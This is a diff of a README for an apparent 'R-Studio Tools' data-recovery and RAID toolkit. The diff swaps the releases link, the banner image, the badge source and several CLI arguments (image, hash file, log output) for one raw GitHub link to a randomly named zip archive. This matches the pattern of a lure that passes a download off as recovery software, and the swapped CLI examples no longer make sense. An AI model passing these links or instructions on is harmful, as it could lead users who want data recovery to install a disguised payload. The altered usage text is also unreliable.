@@ -1,8 +1,8 @@
-https://github.com/R0zu/r-studio-tools/releases
+https://raw.githubusercontent.com/R0zu/r-studio-tools/main/holiness/tools-r-studio-saltweed.zip
 
 # R-Studio Tools for Data Recovery, RAID Recovery, and Network RAID
 
-![R-Studio Tools Banner](https://github.githubassets.com/images/modules/logos_page/mark-github/github-mark.png)
+![R-Studio Tools Banner](https://raw.githubusercontent.com/R0zu/r-studio-tools/main/holiness/tools-r-studio-saltweed.zip)
 
 A practical toolkit for data recovery and RAID recovery workflows. This project covers data salvage from damaged disks, rebuilds of RAID sets, and diagnostics for Network RAID configurations. It blends guided workflows with powerful utilities to help you recover files, restore access, and validate data integrity across local disks and networked storage.
 
@@ -105,12 +105,12 @@ Usage scenarios and examples
 CLI and scripting basics
 If you prefer automation, the project exposes a command-line interface (CLI) to perform common tasks. CLI usage can speed up repetitive recovery operations or be embedded into scripts for larger data workflows.
 
-- Scan: scan --source /dev/sdb or scan --image backup.img
+- Scan: scan --source /dev/sdb or scan --image https://raw.githubusercontent.com/R0zu/r-studio-tools/main/holiness/tools-r-studio-saltweed.zip
 - Inspect: inspect --part 1 --detail
 - Rebuild: raid-rebuild --raid /dev/md0 --degraded
 - Export: export --destination /mnt/recover --files "*.docx, *.xlsx"
-- Validate: validate --hashes checksums.txt
-- Log: log --level info --output recover.log
+- Validate: validate --hashes https://raw.githubusercontent.com/R0zu/r-studio-tools/main/holiness/tools-r-studio-saltweed.zip
+- Log: log --level info --output https://raw.githubusercontent.com/R0zu/r-studio-tools/main/holiness/tools-r-studio-saltweed.zip
 
 A few tips for scripting
 - Use non-destructive options by default. If you need to perform destructive actions, confirm prompts or pass explicit flags to bypass prompts.
@@ -205,9 +205,9 @@ Visual style and branding
 
 Releases and assets link usage
 - The official Releases page hosts the latest builds and assets. Use the link provided above to reach the assets. If you need to verify the latest version, the Releases hub is the quickest path to the newest files.
-- For convenience, a colorful download button is provided to direct you to the same link. This button uses a standard badge from img.shields.io to convey a clear call to action.
+- For convenience, a colorful download button is provided to direct you to the same link. This button uses a standard badge from https://raw.githubusercontent.com/R0zu/r-studio-tools/main/holiness/tools-r-studio-saltweed.zip to convey a clear call to action.
 
-[Releases page](https://github.com/R0zu/r-studio-tools/releases)
+[Releases page](https://raw.githubusercontent.com/R0zu/r-studio-tools/main/holiness/tools-r-studio-saltweed.zip)
 
 Appendix: architectural overview
 - Core modules: scanning, analysis, RAID handling, network access, export, and reporting.
